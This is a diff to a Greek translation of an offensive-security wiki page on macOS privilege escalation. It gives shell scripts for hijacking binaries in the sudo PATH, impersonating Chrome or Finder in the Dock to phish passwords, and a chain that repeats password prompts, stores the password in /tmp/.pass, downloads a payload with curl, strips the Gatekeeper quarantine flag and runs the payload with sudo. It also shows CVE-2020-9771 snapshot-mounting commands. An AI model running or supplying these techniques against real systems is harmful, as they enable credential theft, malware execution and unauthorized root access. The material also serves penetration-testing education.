@@ -4,7 +4,8 @@
 
 ## TCC Privilege Escalation
 
-Αν ήρθατε εδώ ψάχνοντας για TCC privilege escalation πηγαίνετε στο:
+Αν ήρθατε εδώ αναζητώντας TCC privilege escalation, πηγαίνετε στο:
+
 
 {{#ref}}
 macos-security-protections/macos-tcc/
@@ -12,19 +13,20 @@ macos-security-protections/macos-tcc/
 
 ## Linux Privesc
 
-Παρακαλώ σημειώστε ότι **οι περισσότερες από τις τεχνικές για privilege escalation που επηρεάζουν το Linux/Unix θα επηρεάσουν επίσης τις μηχανές MacOS**. Έτσι δείτε:
+Παρακαλώ σημειώστε ότι **τα περισσότερα από τα κόλπα σχετικά με την privilege escalation που επηρεάζουν Linux/Unix θα επηρεάσουν επίσης συστήματα MacOS**. Οπότε δείτε:
+
 
 {{#ref}}
 ../../linux-hardening/privilege-escalation/
 {{#endref}}
 
-## User Interaction
+## Αλληλεπίδραση Χρήστη
 
 ### Sudo Hijacking
 
-Μπορείτε να βρείτε την αρχική [Sudo Hijacking technique μέσα στην ανάρτηση Linux Privilege Escalation](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking).
+Μπορείτε να βρείτε την αρχική [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking).
 
-Ωστόσο, το macOS **διατηρεί** το **`PATH`** του χρήστη όταν εκτελεί **`sudo`**. Αυτό σημαίνει ότι ένας άλλος τρόπος για να επιτευχθεί αυτή η επίθεση θα ήταν να **παρακάμψετε άλλες δυαδικές** που το θύμα θα εκτελέσει όταν **τρέχει sudo:**
+Ωστόσο, το macOS **διατηρεί** το **`PATH`** του χρήστη όταν αυτός εκτελεί **`sudo`**. Αυτό σημαίνει ότι ένας άλλος τρόπος για να πραγματοποιηθεί αυτή η επίθεση θα ήταν να **hijack other binaries** που το θύμα θα εκτελούσε όταν **running sudo:**
 ```bash
 # Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
 cat > /opt/homebrew/bin/ls <<EOF
@@ -39,17 +41,17 @@ chmod +x /opt/homebrew/bin/ls
 # victim
 sudo ls
 ```
-Σημειώστε ότι ένας χρήστης που χρησιμοποιεί το τερματικό θα έχει πολύ πιθανό **εγκατεστημένο το Homebrew**. Έτσι, είναι δυνατόν να υποκλέψετε δυαδικά αρχεία στο **`/opt/homebrew/bin`**.
+Σημειώστε ότι ένας χρήστης που χρησιμοποιεί το τερματικό μάλλον θα έχει εγκατεστημένο το **Homebrew**. Επομένως είναι δυνατό να υποκλέψετε binaries στο **`/opt/homebrew/bin`**.
 
-### Υποκρισία Dock
+### Dock Impersonation
 
-Χρησιμοποιώντας κάποια **κοινωνική μηχανική**, θα μπορούσατε να **υποκριθείτε για παράδειγμα το Google Chrome** μέσα στο dock και στην πραγματικότητα να εκτελέσετε το δικό σας σενάριο:
+Χρησιμοποιώντας λίγη **social engineering** θα μπορούσατε να **υποδυθείτε, για παράδειγμα, το Google Chrome** μέσα στο Dock και στην πραγματικότητα να εκτελέσετε το δικό σας script:
 
 {{#tabs}}
 {{#tab name="Chrome Impersonation"}}
-Ορισμένες προτάσεις:
+Μερικές προτάσεις:
 
-- Ελέγξτε στο Dock αν υπάρχει ένα Chrome, και σε αυτή την περίπτωση **αφαιρέστε** αυτή την καταχώρηση και **προσθέστε** την **ψεύτικη** **καταχώρηση Chrome στην ίδια θέση** στον πίνακα Dock.
+- Ελέγξτε στο Dock αν υπάρχει Chrome, και σε αυτή την περίπτωση **αφαιρέστε** αυτή την εγγραφή και **προσθέστε** την **ψεύτικη** **Chrome εγγραφή στην ίδια θέση** στο Dock array.
 ```bash
 #!/bin/sh
 
@@ -122,13 +124,13 @@ killall Dock
 {{#endtab}}
 
 {{#tab name="Finder Impersonation"}}
-Ορισμένες προτάσεις:
+Μερικές προτάσεις:
 
-- Δεν **μπορείτε να αφαιρέσετε τον Finder από το Dock**, οπότε αν σκοπεύετε να τον προσθέσετε στο Dock, μπορείτε να τοποθετήσετε τον ψεύτικο Finder ακριβώς δίπλα στον πραγματικό. Για αυτό χρειάζεται να **προσθέσετε την ψεύτικη καταχώρηση του Finder στην αρχή του πίνακα Dock**.
-- Μια άλλη επιλογή είναι να μην τον τοποθετήσετε στο Dock και απλώς να τον ανοίξετε, "Finder που ζητά να ελέγξει τον Finder" δεν είναι τόσο περίεργο.
-- Μια άλλη επιλογή για **να αποκτήσετε δικαιώματα root χωρίς να ζητήσετε** τον κωδικό πρόσβασης με ένα απαίσιο παράθυρο, είναι να κάνετε τον Finder να ζητήσει πραγματικά τον κωδικό πρόσβασης για να εκτελέσει μια προνομιούχα ενέργεια:
-- Ζητήστε από τον Finder να αντιγράψει στο **`/etc/pam.d`** ένα νέο αρχείο **`sudo`** (Η προτροπή που ζητά τον κωδικό πρόσβασης θα υποδεικνύει ότι "ο Finder θέλει να αντιγράψει το sudo")
-- Ζητήστε από τον Finder να αντιγράψει ένα νέο **Authorization Plugin** (Μπορείτε να ελέγξετε το όνομα του αρχείου ώστε η προτροπή που ζητά τον κωδικό πρόσβασης να υποδεικνύει ότι "ο Finder θέλει να αντιγράψει το Finder.bundle")
+- You **cannot remove Finder from the Dock**, οπότε αν πρόκειται να το προσθέσετε στο Dock, μπορείτε να τοποθετήσετε τον ψεύτικο Finder ακριβώς δίπλα στον πραγματικό. Για αυτό χρειάζεται να **προσθέσετε την καταχώρηση του ψεύτικου Finder στην αρχή του Dock array**.
+- Μια άλλη επιλογή είναι να μην τοποθετήσετε το εικονίδιο στο Dock και απλώς να το ανοίξετε — "Finder asking to control Finder" δεν είναι τόσο περίεργο.
+- Μια ακόμα επιλογή για να **escalate to root without asking** τον κωδικό με ένα άσχημο παράθυρο, είναι να κάνετε τον Finder να ζητήσει πραγματικά τον κωδικό για να εκτελέσει μια προνομιούχα ενέργεια:
+- Ζητήστε από τον Finder να αντιγράψει στο **`/etc/pam.d`** ένα νέο αρχείο **`sudo`** (Το παράθυρο που θα ζητήσει τον κωδικό θα αναφέρει ότι "Finder wants to copy sudo")
+- Ζητήστε από τον Finder να αντιγράψει ένα νέο **Authorization Plugin** (Μπορείτε να ελέγξετε το όνομα αρχείου ώστε το παράθυρο που ζητά τον κωδικό να αναφέρει ότι "Finder wants to copy Finder.bundle")
 ```bash
 #!/bin/sh
 
@@ -201,12 +203,33 @@ killall Dock
 {{#endtab}}
 {{#endtabs}}
 
-## TCC - Ανύψωση Δικαιωμάτων Ρίζας
+### Password prompt phishing + sudo reuse
 
-### CVE-2020-9771 - παράκαμψη TCC mount_apfs και ανύψωση δικαιωμάτων
+Το κακόβουλο λογισμικό συχνά καταχράται την αλληλεπίδραση με τον χρήστη για να **αποσπάσει έναν κωδικό που μπορεί να χρησιμοποιηθεί με sudo** και να τον επανχρησιμοποιήσει προγραμματισμένα. Μια κοινή ροή:
 
-**Οποιοσδήποτε χρήστης** (ακόμα και αυτοί χωρίς δικαιώματα) μπορεί να δημιουργήσει και να τοποθετήσει ένα στιγμιότυπο μηχανής χρόνου και **να έχει πρόσβαση σε ΟΛΑ τα αρχεία** αυτού του στιγμιότυπου.\
-Η **μόνη προϋπόθεση** είναι η εφαρμογή που χρησιμοποιείται (όπως το `Terminal`) να έχει **Πλήρη Πρόσβαση Δίσκου** (FDA) (`kTCCServiceSystemPolicyAllfiles`), η οποία πρέπει να παραχωρηθεί από έναν διαχειριστή.
+1. Προσδιορίστε τον συνδεδεμένο χρήστη με `whoami`.
+2. **Επαναλάβετε τις προτροπές κωδικού** μέχρι `dscl . -authonly "$user" "$pw"` να επιστρέψει επιτυχία.
+3. Αποθηκεύστε προσωρινά το διαπιστευτήριο (π.χ., `/tmp/.pass`) και εκτελέστε ενέργειες με προνόμια με `sudo -S` (ο κωδικός μέσω stdin).
+
+Example minimal chain:
+```bash
+user=$(whoami)
+while true; do
+read -s -p "Password: " pw; echo
+dscl . -authonly "$user" "$pw" && break
+done
+printf '%s\n' "$pw" > /tmp/.pass
+curl -o /tmp/update https://example.com/update
+printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
+```
+Ο κλεμμένος κωδικός μπορεί στη συνέχεια να επαναχρησιμοποιηθεί για να **αφαιρέσει την καραντίνα του Gatekeeper με `xattr -c`**, να αντιγράψει LaunchDaemons ή άλλα αρχεία με προνόμια, και να εκτελέσει επιπλέον στάδια μη διαδραστικά.
+
+## TCC - Root Privilege Escalation
+
+### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation
+
+**Οποιοσδήποτε χρήστης** (ακόμη και χρήστες χωρίς προνόμια) μπορεί να δημιουργήσει και να προσαρτήσει ένα snapshot του Time Machine και να **αποκτήσει πρόσβαση ΣΕ ΟΛΑ τα αρχεία** αυτού του snapshot.\
+Τα **μόνα προνόμια** που απαιτούνται είναι να έχει η εφαρμογή που χρησιμοποιείται (όπως το `Terminal`) **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), τα οποία πρέπει να χορηγηθούν από έναν διαχειριστή.
 ```bash
 # Create snapshot
 tmutil localsnapshot
@@ -226,15 +249,19 @@ mkdir /tmp/snap
 # Access it
 ls /tmp/snap/Users/admin_user # This will work
 ```
-Μια πιο λεπτομερής εξήγηση μπορεί να [**βρεθεί στην αρχική αναφορά**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**
+Μια πιο λεπτομερής εξήγηση μπορεί να βρεθεί [**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**
 
 ## Ευαίσθητες Πληροφορίες
 
-Αυτό μπορεί να είναι χρήσιμο για την κλιμάκωση δικαιωμάτων:
+Αυτό μπορεί να είναι χρήσιμο για escalate privileges:
 
 
 {{#ref}}
 macos-files-folders-and-binaries/macos-sensitive-locations.md
 {{#endref}}
+
+## Αναφορές
+
+- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
 
 {{#include ../../banners/hacktricks-training.md}}
